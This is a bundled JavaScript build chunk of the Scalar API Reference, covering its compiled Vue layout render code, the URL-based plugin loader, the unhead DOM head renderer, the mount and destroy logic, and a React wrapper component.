					}, _ctx.$attrs.class]]),
					dir: unref(apiReferenceLocalization).direction.value,
					lang: documentLang.value
				}, [
					unref(agent).agentEnabled.value && hasOpenedAgent.value ? (openBlock(), createBlock(unref(AgentScalarDrawer), {
						key: 0,
						agentScalarConfiguration: configList.value[activeSlug.value]?.agent,
						externalUrls: mergedConfig.value.externalUrls,
						workspaceStore: unref(workspaceStore)
					}, null, 8, [
						"agentScalarConfiguration",
						"externalUrls",
						"workspaceStore"
					])) : createCommentVNode("", true),
					mergedConfig.value.layout === "modern" ? (openBlock(), createBlock(MobileHeader_default, {
						key: 1,
						breadcrumb: breadcrumb.value,
						isSidebarOpen: isSidebarOpen.value,
						showSidebar: mergedConfig.value.showSidebar,
						onToggleSidebar: _cache[5] || (_cache[5] = () => isSidebarOpen.value = !isSidebarOpen.value)
					}, {
						search: withCtx(() => [!mergedConfig.value.hideSearch ? (openBlock(), createBlock(SearchButton_default, {
							key: 0,
							class: "my-2",
							document: activeSearchableDocument.value,
							eventBus: unref(eventBus),
							hideModels: mergedConfig.value.hideModels,
							modelsSectionLabel: mergedConfig.value.modelsSectionLabel,
							searchHotKey: mergedConfig.value.searchHotKey,
							showSidebar: mergedConfig.value.showSidebar
						}, null, 8, [
							"document",
							"eventBus",
							"hideModels",
							"modelsSectionLabel",
							"searchHotKey",
							"showSidebar"
						])) : createCommentVNode("", true)]),
						sidebar: withCtx(({ sidebarClasses }) => [mergedConfig.value.showSidebar && mergedConfig.value.layout === "modern" ? (openBlock(), createBlock(unref(ScalarSidebar_default), {
							key: 0,
							"aria-label": unref(apiReferenceLocalization).translate("navigation.sidebarFor", { name: unref(workspaceStore).workspace.activeDocument?.info?.title ?? "" }),
							class: normalizeClass(["t-doc__sidebar", sidebarClasses]),
							getHref: getSidebarItemHref,
							isExpanded: unref(sidebarState).isExpanded,
							isSelected: unref(sidebarState).isSelected,
							items: sidebarItems.value,
							layout: "reference",
							options: sidebarOptions.value,
							onSelectItem: _cache[3] || (_cache[3] = (id) => handleSelectSidebarEntry(id, "sidebar")),
							onToggleGroup: _cache[4] || (_cache[4] = (id) => unref(sidebarState).setExpanded(id, !unref(sidebarState).isExpanded(id)))
						}, {
							header: withCtx(() => [
								documentOptionList.value.length > 1 ? (openBlock(), createBlock(DocumentSelector_default, {
									key: 0,
									modelValue: activeSlug.value,
									options: documentOptionList.value,
									"onUpdate:modelValue": changeSelectedDocument
								}, null, 8, ["modelValue", "options"])) : createCommentVNode("", true),
								!mergedConfig.value.hideSearch ? (openBlock(), createElementBlock("div", _hoisted_2, [createVNode(SearchButton_default, {
									document: activeSearchableDocument.value,
									eventBus: unref(eventBus),
									hideModels: mergedConfig.value.hideModels,
									modelsSectionLabel: mergedConfig.value.modelsSectionLabel,
									searchHotKey: mergedConfig.value.searchHotKey
								}, null, 8, [
									"document",
									"eventBus",
									"hideModels",
									"modelsSectionLabel",
									"searchHotKey"
								]), unref(agent).agentEnabled.value ? (openBlock(), createBlock(unref(AgentScalarButton_default), { key: 0 })) : createCommentVNode("", true)])) : createCommentVNode("", true),
								renderSlot(_ctx.$slots, "sidebar-start", normalizeProps$1(guardReactiveProps(slotProps.value)), void 0, true)
							]),
							before: withCtx(() => [createVNode(unref(AsyncApiSidebarFilters_default), {
								protocol: selectedProtocol.value,
								"onUpdate:protocol": _cache[0] || (_cache[0] = ($event) => selectedProtocol.value = $event),
								server: selectedServer.value,
								"onUpdate:server": _cache[1] || (_cache[1] = ($event) => selectedServer.value = $event),
								document: activeAsyncApiDocument.value
							}, null, 8, [
								"protocol",
								"server",
								"document"
							]), activeAsyncApiDocument.value ? (openBlock(), createBlock(unref(ScalarSidebarSection_default), {
								key: 0,
								class: "asyncapi-sidebar-document-section"
							}, {
								default: withCtx(() => [..._cache[8] || (_cache[8] = [createTextVNode(" Document ", -1)])]),
								_: 1
							})) : createCommentVNode("", true)]),
							footer: withCtx(() => [renderSlot(_ctx.$slots, "sidebar-end", normalizeProps$1(guardReactiveProps(slotProps.value)), () => [createVNode(unref(ScalarSidebarFooter_default), { class: "darklight-reference" }, {
								description: withCtx(() => [createBaseVNode("a", _hoisted_3, toDisplayString(unref(apiReferenceLocalization).translate("footer.poweredByScalar")), 1)]),
								toggle: withCtx(() => [!mergedConfig.value.hideDarkModeToggle && !mergedConfig.value.forceDarkModeState ? (openBlock(), createBlock(unref(ScalarColorModeToggleButton_default), {
									key: 0,
									modelValue: colorMode.value === "dark",
									"onUpdate:modelValue": _cache[2] || (_cache[2] = () => unref(toggleColorMode)())
								}, null, 8, ["modelValue"])) : (openBlock(), createElementBlock("span", _hoisted_4))]),
								default: withCtx(() => [!mergedConfig.value.hideClientButton && !showMCPButton.value ? (openBlock(), createBlock(unref(OpenApiClientButton_default), {
									key: 0,
									buttonSource: "sidebar",
									integration: mergedConfig.value._integration,
									isDevelopment: unref(isDevelopment),
									url: documentUrl.value
								}, null, 8, [
									"integration",
									"isDevelopment",
									"url"
								])) : createCommentVNode("", true), showMCPButton.value ? (openBlock(), createBlock(unref(OpenMCPButton_default), {
									key: 1,
									config: mergedConfig.value.mcp,
									externalUrls: mergedConfig.value.externalUrls,
									isDevelopment: unref(isDevelopment),
									url: documentUrl.value,
									workspace: unref(workspaceStore)
								}, null, 8, [
									"config",
									"externalUrls",
									"isDevelopment",
									"url",
									"workspace"
								])) : createCommentVNode("", true)]),
								_: 1
							})], true)]),
							_: 3
						}, 8, [
							"aria-label",
							"class",
							"isExpanded",
							"isSelected",
							"items",
							"options"
						])) : createCommentVNode("", true)]),
						_: 3
					}, 8, [
						"breadcrumb",
						"isSidebarOpen",
						"showSidebar"
					])) : createCommentVNode("", true),
					showCrawlerNav.value ? (openBlock(), createBlock(CrawlerNav_default, {
						key: 2,
						basePath: basePath.value,
						isMultiDocument: isMultiDocument.value,
						items: sidebarItems.value,
						options: sidebarOptions.value
					}, null, 8, [
						"basePath",
						"isMultiDocument",
						"items",
						"options"
					])) : createCommentVNode("", true),
					createBaseVNode("main", {
						"aria-label": unref(apiReferenceLocalization).translate("navigation.mainContent", { name: unref(workspaceStore).workspace.activeDocument?.info?.title ?? "" }),
						class: "references-rendered",
						inert: unref(agent).showAgent.value
					}, [createVNode(Content_default, {
						authStore: unref(clientStore).auth,
						clientDocument: unref(clientStore).workspace.activeDocument,
						contextChain: contextChain.value,
						document: unref(workspaceStore).workspace.activeDocument,
						documentSlug: activeSlug.value,
						environment: environment.value,
						eventBus: unref(eventBus),
						expandedItems: unref(sidebarState).expandedItems.value,
						headingSlugGenerator: mergedConfig.value.generateHeadingSlug ?? ((heading) => `${activeSlug.value}/description/${heading.slug}`),
						infoSectionId: infoSectionId.value,
						items: sidebarItems.value,
						options: runtimeConfig.value,
						xScalarDefaultClient: unref(clientStore).workspace["x-scalar-default-client"],
						xScalarDefaultExample: unref(clientStore).workspace["x-scalar-default-example"]
					}, createSlots({
						start: withCtx(() => [
							createBaseVNode("div", {
								ref_key: "documentStartRef",
								ref: documentStartRef
							}, null, 512),
							unref(workspaceStore).workspace.activeDocument ? (openBlock(), createBlock(unref(DeveloperTools_default), {
								key: 0,
								overrides: configurationOverrides.value,
								"onUpdate:overrides": _cache[6] || (_cache[6] = ($event) => configurationOverrides.value = $event),
								class: "references-developer-tools",
								configuration: mergedConfig.value,
								externalUrls: mergedConfig.value.externalUrls,
								workspace: unref(workspaceStore)
							}, null, 8, [
								"overrides",
								"configuration",
								"externalUrls",
								"workspace"
							])) : createCommentVNode("", true),
							mergedConfig.value.layout === "classic" ? (openBlock(), createBlock(ClassicHeader_default, { key: 1 }, {
								"dark-mode-toggle": withCtx(() => [!mergedConfig.value.hideDarkModeToggle && !mergedConfig.value.forceDarkModeState ? (openBlock(), createBlock(unref(ScalarColorModeToggleIcon_default), {
									key: 0,
									class: "text-c-2 hover:text-c-1",
									mode: colorMode.value,
									style: { "transform": "scale(1.4)" },
									variant: "icon",
									onClick: _cache[7] || (_cache[7] = () => unref(toggleColorMode)())
								}, null, 8, ["mode"])) : createCommentVNode("", true)]),
								default: withCtx(() => [createBaseVNode("div", _hoisted_6, [documentOptionList.value.length > 1 ? (openBlock(), createBlock(DocumentSelector_default, {
									key: 0,
									modelValue: activeSlug.value,
									options: documentOptionList.value,
									"onUpdate:modelValue": changeSelectedDocument
								}, null, 8, ["modelValue", "options"])) : createCommentVNode("", true)]), !mergedConfig.value.hideSearch ? (openBlock(), createBlock(SearchButton_default, {
									key: 0,
									class: "t-doc__sidebar max-w-64",
									document: activeSearchableDocument.value,
									eventBus: unref(eventBus),
									hideModels: mergedConfig.value.hideModels,
									modelsSectionLabel: mergedConfig.value.modelsSectionLabel,
									searchHotKey: mergedConfig.value.searchHotKey
								}, null, 8, [
									"document",
									"eventBus",
									"hideModels",
									"modelsSectionLabel",
									"searchHotKey"
								])) : createCommentVNode("", true)]),
								_: 1
							})) : createCommentVNode("", true),
							renderSlot(_ctx.$slots, "content-start", normalizeProps$1(guardReactiveProps(slotProps.value)), void 0, true)
						]),
						end: withCtx(() => [renderSlot(_ctx.$slots, "content-end", normalizeProps$1(guardReactiveProps(slotProps.value)), void 0, true)]),
						_: 2
					}, [mergedConfig.value.isEditable ? {
						name: "empty-state",
						fn: withCtx(() => [renderSlot(_ctx.$slots, "editor-placeholder", normalizeProps$1(guardReactiveProps(slotProps.value)), void 0, true)]),
						key: "0"
					} : void 0]), 1032, [
						"authStore",
						"clientDocument",
						"contextChain",
						"document",
						"documentSlug",
						"environment",
						"eventBus",
						"expandedItems",
						"headingSlugGenerator",
						"infoSectionId",
						"items",
						"options",
						"xScalarDefaultClient",
						"xScalarDefaultExample"
					])], 8, _hoisted_5),
					_ctx.$slots.footer ? (openBlock(), createElementBlock("div", _hoisted_7, [renderSlot(_ctx.$slots, "footer", normalizeProps$1(guardReactiveProps(slotProps.value)), void 0, true)])) : createCommentVNode("", true),
					createBaseVNode("div", {
						ref_key: "modal",
						ref: modal
					}, null, 512),
					clientLoadingStatus.value !== "idle" ? (openBlock(), createElementBlock("div", {
						key: 4,
						class: "bg-b-1 text-c-1 fixed right-4 bottom-4 z-[10001] rounded-lg border px-4 py-3 text-sm shadow-lg",
						role: clientLoadingStatus.value === "error" ? "alert" : "status"
					}, toDisplayString(clientLoadingStatus.value === "loading" ? "Loading request editor…" : "Could not load the request editor. Refresh the page and try again."), 9, _hoisted_8)) : createCommentVNode("", true)
				], 10, _hoisted_1),
				createVNode(unref(ScalarToasts_default))
			]);
		};
	}
}), [["__scopeId", "data-v-5b175b20"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/standalone/lib/load-plugins-from-urls.js
/**
* Import a plugin module with a browser-native dynamic `import()`.
*
* The specifier is fully dynamic, so bundlers can't analyze it and leave the `import()` call
* as-is in the output (including the UMD standalone bundle) — the `@vite-ignore` comment just
* silences the warning about that.
*/
var importModule = (url) => import(
	/* @vite-ignore */
	url
);
/**
* Load a single plugin module and return its default export.
*
* Failures (network errors, modules without a function default export) are logged and swallowed
* so a broken plugin URL never prevents the API reference itself from mounting.
*/
var loadPluginFromUrl = async (url) => {
	try {
		const plugin = (await importModule(url))?.default;
		if (typeof plugin !== "function") {
			console.error(`[@scalar/api-reference] The module at ${url} does not export an API Reference plugin as its default export.`);
			return;
		}
		return plugin;
	} catch (error) {
		console.error(`[@scalar/api-reference] Failed to load the plugin module at ${url}:`, error);
		return;
	}
};
/** Normalize the configuration input to a list of configuration objects */
var getConfigurations = (configuration) => Array.isArray(configuration) ? configuration : [configuration];
/** Whether any of the passed configurations reference a plugin by URL */
var hasPluginUrls = (configuration) => getConfigurations(configuration).some((config) => Boolean(config.pluginUrls?.length));
/**
* Resolve the `pluginUrls` of all passed configurations and append the loaded plugins to the
* respective configuration's `plugins`.
*
* Plugin registration is not reactive — plugins are read once when the API reference renders for
* the first time — so this must complete before the app is mounted. Each URL is imported only
* once, even when multiple configurations reference it.
*/
var loadPluginsFromUrls = async (configuration) => {
	const pendingImports = /* @__PURE__ */ new Map();
	const importOnce = (url) => {
		const pending = pendingImports.get(url) ?? loadPluginFromUrl(url);
		pendingImports.set(url, pending);
		return pending;
	};
	await Promise.all(getConfigurations(configuration).map(async (config) => {
		if (!config.pluginUrls?.length) return;
		const plugins = (await Promise.all(config.pluginUrls.map(importOnce))).filter((plugin) => plugin !== void 0);
		if (plugins.length) config.plugins = [...config.plugins ?? [], ...plugins];
	}));
};
//#endregion
//#region node_modules/unhead/dist/client.mjs
async function renderDOMHead(head, options = {}) {
	const dom = options.document || head.resolvedOptions.document;
	if (!dom || !head.dirty) return;
	const beforeRenderCtx = {
		shouldRender: true,
		tags: []
	};
	await head.hooks.callHook("dom:beforeRender", beforeRenderCtx);
	if (!beforeRenderCtx.shouldRender) return;
	if (head._domUpdatePromise) return head._domUpdatePromise;
	head._domUpdatePromise = new Promise(async (resolve) => {
		const dupeKeyCounter = /* @__PURE__ */ new Map();
		const resolveTagPromise = new Promise((resolve2) => {
			head.resolveTags().then((tags2) => {
				resolve2(tags2.map((tag) => {
					const count = dupeKeyCounter.get(tag._d) || 0;
					const res = {
						tag,
						id: (count ? `${tag._d}:${count}` : tag._d) || tag._h,
						shouldRender: true
					};
					if (tag._d && isMetaArrayDupeKey(tag._d)) dupeKeyCounter.set(tag._d, count + 1);
					return res;
				}));
			});
		});
		let state = head._dom;
		if (!state) {
			state = {
				title: dom.title,
				elMap: (/* @__PURE__ */ new Map()).set("htmlAttrs", dom.documentElement).set("bodyAttrs", dom.body)
			};
			for (const key of ["body", "head"]) {
				const children = dom[key]?.children;
				for (const c of children) {
					const tag = c.tagName.toLowerCase();
					if (!HasElementTags.has(tag)) continue;
					const next = normalizeProps({
						tag,
						props: {}
					}, {
						innerHTML: c.innerHTML,
						...c.getAttributeNames().reduce((props, name) => {
							props[name] = c.getAttribute(name);
							return props;
						}, {}) || {}
					});
					next.key = c.getAttribute("data-hid") || void 0;
					next._d = dedupeKey(next) || hashTag(next);
					if (state.elMap.has(next._d)) {
						let count = 1;
						let k = next._d;
						while (state.elMap.has(k)) k = `${next._d}:${count++}`;
						state.elMap.set(k, c);
					} else state.elMap.set(next._d, c);
				}
			}
		}
		state.pendingSideEffects = { ...state.sideEffects };
		state.sideEffects = {};
		function track(id, scope, fn) {
			const k = `${id}:${scope}`;
			state.sideEffects[k] = fn;
			delete state.pendingSideEffects[k];
		}
		function trackCtx({ id, $el, tag }) {
			const isAttrTag = tag.tag.endsWith("Attrs");
			state.elMap.set(id, $el);
			if (!isAttrTag) {
				if (tag.textContent && tag.textContent !== $el.textContent) $el.textContent = tag.textContent;
				if (tag.innerHTML && tag.innerHTML !== $el.innerHTML) $el.innerHTML = tag.innerHTML;
				track(id, "el", () => {
					$el?.remove();
					state.elMap.delete(id);
				});
			}
			for (const k in tag.props) {
				if (!Object.prototype.hasOwnProperty.call(tag.props, k)) continue;
				const value = tag.props[k];
				if (k.startsWith("on") && typeof value === "function") {
					const dataset = $el?.dataset;
					if (dataset && dataset[`${k}fired`]) {
						const ek = k.slice(0, -5);
						value.call($el, new Event(ek.substring(2)));
					}
					if ($el.getAttribute(`data-${k}`) !== "") {
						(tag.tag === "bodyAttrs" ? dom.defaultView : $el).addEventListener(k.substring(2), value.bind($el));
						$el.setAttribute(`data-${k}`, "");
					}
					continue;
				}
				const ck = `attr:${k}`;
				if (k === "class") {
					if (!value) continue;
					for (const c of value) {
						isAttrTag && track(id, `${ck}:${c}`, () => $el.classList.remove(c));
						!$el.classList.contains(c) && $el.classList.add(c);
					}
				} else if (k === "style") {
					if (!value) continue;
					for (const [k2, v] of value) {
						track(id, `${ck}:${k2}`, () => {
							$el.style.removeProperty(k2);
						});
						$el.style.setProperty(k2, v);
					}
				} else if (value !== false && value !== null) {
					$el.getAttribute(k) !== value && $el.setAttribute(k, value === true ? "" : String(value));
					isAttrTag && track(id, ck, () => $el.removeAttribute(k));
				}
			}
		}
		const pending = [];
		const frag = {
			bodyClose: void 0,
			bodyOpen: void 0,
			head: void 0
		};
		const tags = await resolveTagPromise;
		for (const ctx of tags) {
			const { tag, shouldRender, id } = ctx;
			if (!shouldRender) continue;
			if (tag.tag === "title") {
				dom.title = tag.textContent;
				track("title", "", () => dom.title = state.title);
				continue;
			}
			ctx.$el = ctx.$el || state.elMap.get(id);
			if (ctx.$el) trackCtx(ctx);
			else if (HasElementTags.has(tag.tag)) pending.push(ctx);
		}
		for (const ctx of pending) {
			const pos = ctx.tag.tagPosition || "head";
			ctx.$el = dom.createElement(ctx.tag.tag);
			trackCtx(ctx);
			frag[pos] = frag[pos] || dom.createDocumentFragment();
			frag[pos].appendChild(ctx.$el);
		}
		for (const ctx of tags) await head.hooks.callHook("dom:renderTag", ctx, dom, track);
		frag.head && dom.head.appendChild(frag.head);
		frag.bodyOpen && dom.body.insertBefore(frag.bodyOpen, dom.body.firstChild);
		frag.bodyClose && dom.body.appendChild(frag.bodyClose);
		for (const k in state.pendingSideEffects) state.pendingSideEffects[k]();
		head._dom = state;
		await head.hooks.callHook("dom:rendered", { renders: tags });
		resolve();
	}).finally(() => {
		head._domUpdatePromise = void 0;
		head.dirty = false;
	});
	return head._domUpdatePromise;
}
function createHead$1(options = {}) {
	const render = options.domOptions?.render || renderDOMHead;
	options.document = options.document || (typeof window !== "undefined" ? document : void 0);
	const initialPayload = options.document?.head.querySelector("script[id=\"unhead:payload\"]")?.innerHTML || false;
	const head = /* @__PURE__ */ createUnhead({
		...options,
		plugins: [...options.plugins || [], {
			key: "client",
			hooks: { "entries:updated": render }
		}],
		init: [initialPayload ? JSON.parse(initialPayload) : false, ...options.init || []]
	});
	head.ssr = false;
	return head;
}
function createDebouncedFn(callee, delayer) {
	let ctxId = 0;
	return () => {
		const delayFnCtxId = ++ctxId;
		delayer(() => {
			if (ctxId === delayFnCtxId) callee();
		});
	};
}
//#endregion
//#region node_modules/@unhead/vue/dist/client.mjs
// @__NO_SIDE_EFFECTS__
function createHead(options = {}) {
	const head = createHead$1({
		domOptions: { render: createDebouncedFn(() => renderDOMHead(head), (fn) => setTimeout(fn, 0)) },
		...options
	});
	head.install = /* @__PURE__ */ vueInstall(head);
	return head;
}
//#endregion
//#region node_modules/@scalar/api-reference/dist/standalone/lib/html-api.js
/**
* The id given to the standalone build's single injected `<style>` tag.
* Keep in sync with `vite.standalone.config.ts` and `vite.standalone.esm.config.ts`.
*/
var STANDALONE_STYLE_ID = "scalar-style";
/**
* Per-document bookkeeping for the standalone build's injected styles.
*
* The CDN build injects all of its CSS into one `<style>` tag in `<head>`. Under
* SPA-style navigation (Turbo Drive, htmx boost, Astro view transitions) the host
* swaps the DOM without reloading the window, so those document-level styles
* (`@layer scalar-base`, the `:root` theme variables) would otherwise linger and
* bleed into the host app's next page. We reference-count the live instances and
* detach the styles when the last one is destroyed, re-attaching them when a new
* instance mounts so navigating back to the reference is still styled.
*
* State is keyed by document so the counter survives navigations (the JS context
* persists) while staying isolated per page.
*/
var standaloneStyleState = /* @__PURE__ */ new WeakMap();
var getStandaloneStyleState = (doc) => {
	const existing = standaloneStyleState.get(doc);
	if (existing) return existing;
	const state = {
		count: 0,
		detachedStyle: null
	};
	standaloneStyleState.set(doc, state);
	return state;
};
/** Track a freshly mounted instance and restore previously detached styles. */
var retainStandaloneStyles = (doc) => {
	const state = getStandaloneStyleState(doc);
	state.count += 1;
	if (state.detachedStyle && !doc.getElementById(STANDALONE_STYLE_ID)) {
		doc.head.appendChild(state.detachedStyle);
		state.detachedStyle = null;
	}
};
/** Release an instance and detach the injected styles once the last one is gone. */
var releaseStandaloneStyles = (doc) => {
	const state = getStandaloneStyleState(doc);
	state.count = Math.max(0, state.count - 1);
	if (state.count > 0) return;
	const styleElement = doc.getElementById(STANDALONE_STYLE_ID);
	if (styleElement instanceof HTMLStyleElement) {
		state.detachedStyle = styleElement;
		styleElement.remove();
	}
};
/**
* Create (and mount) a new Scalar API Reference
*
* @example createApiReference({ url: '/scalar.json' }).mount('#app')
* @example createApiReference('#app', { url: '/scalar.json' })
* @example createApiReference(document.getElementById('app'), { url: '/scalar.json' })
*/
var createApiReference = (elementOrSelectorOrConfig, optionalConfiguration) => {
	const idPrefix = "scalar-refs";
	const props = reactive({ configuration: optionalConfiguration ?? elementOrSelectorOrConfig ?? {} });
	const createReferenceApp = (isSsr = false) => {
		const referenceApp = isSsr ? createSSRApp(() => h(ApiReference_default, props)) : createApp(() => h(ApiReference_default, props));
		referenceApp.use(/* @__PURE__ */ createHead());
		referenceApp.config.idPrefix = idPrefix;
		return referenceApp;
	};
	const mountElement = optionalConfiguration ? typeof elementOrSelectorOrConfig === "string" ? document.querySelector(elementOrSelectorOrConfig) : elementOrSelectorOrConfig : null;
	let app = createReferenceApp(!!optionalConfiguration && !!mountElement && mountElement.children.length > 0);
	let hasMounted = false;
	if (optionalConfiguration) if (mountElement) {
		const mount = () => {
			app.mount(mountElement);
			hasMounted = true;
			retainStandaloneStyles(document);
		};
		if (hasPluginUrls(props.configuration)) loadPluginsFromUrls(props.configuration).then(() => {
			if (!abortController.signal.aborted) mount();
		});
		else mount();
	} else console.error("Could not find a mount point for API References:", elementOrSelectorOrConfig);
	const abortController = new AbortController();
	const listenerOptions = {
		capture: false,
		signal: abortController.signal
	};
	/**
	* Reload the API Reference
	* @deprecated
	*/
	document.addEventListener("scalar:reload-references", () => {
		console.warn("scalar:reload-references event has been deprecated, please use the scalarInstance.app.mount method instead.");
		if (!props.configuration) return;
		const currentElement = typeof elementOrSelectorOrConfig === "string" ? document.querySelector(elementOrSelectorOrConfig) : elementOrSelectorOrConfig;
		if (!currentElement) return;
		if (currentElement && !document.body.contains(currentElement)) document.body.appendChild(currentElement);
		app.unmount();
		app = createReferenceApp();
		app.mount(currentElement);
	}, listenerOptions);
	/** Destroy the current API Reference instance */
	const destroy = () => {
		abortController.abort();
		props.configuration = {};
		if (hasMounted) {
			hasMounted = false;
			app.unmount();
			releaseStandaloneStyles(document);
		}
	};
	/**
	* Allow user to destroy the API Reference
	* @deprecated
	*/
	document.addEventListener("scalar:destroy-references", () => {
		console.warn("scalar:destroy-references event has been deprecated, please use scalarInstance.destroy instead.");
		destroy();
	}, listenerOptions);
	/**
	* Allow user to update configuration
	* @deprecated
	*/
	document.addEventListener("scalar:update-references-config", (ev) => {
		console.warn("scalar:update-references-config event has been deprecated, please use scalarInstance.updateConfiguration instead.");
		if ("detail" in ev) Object.assign(props, ev.detail);
	}, listenerOptions);
	return {
		app,
		getConfiguration: () => props.configuration ?? {},
		updateConfiguration: (newConfig) => {
			props.configuration = newConfig;
		},
		destroy
	};
};
//#endregion
//#region node_modules/@scalar/api-reference-react/dist/index.js
var import_react = /* @__PURE__ */ __toESM(require_react(), 1);
var import_jsx_runtime = require_jsx_runtime();
globalThis.__VUE_OPTIONS_API__ = true;
globalThis.__VUE_PROD_HYDRATION_MISMATCH_DETAILS__ = true;
globalThis.__VUE_PROD_DEVTOOLS__ = false;
/**
* React wrapper around the Scalar API Reference
*/
var ApiReferenceReact = (props) => {
	const el = (0, import_react.useRef)(null);
	const [reference, setReference] = (0, import_react.useState)(null);
	/** handle adding the integration to the config */
	const addIntegration = () => Array.isArray(props.configuration) ? props.configuration.map((c) => ({
		_integration: "react",
		...c
	})) : {
		_integration: "react",
		...props.configuration
	};
	(0, import_react.useEffect)(() => {
		if (!el.current) return reference?.app?.unmount;
		const instance = createApiReference(el.current, addIntegration());
		setReference(instance);
		return instance.destroy;
	}, [el]);
	(0, import_react.useEffect)(() => {
		reference?.updateConfiguration(addIntegration());
	}, [props.configuration, reference]);
	return /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", { ref: el });
};
//#endregion
export { ApiReferenceReact };
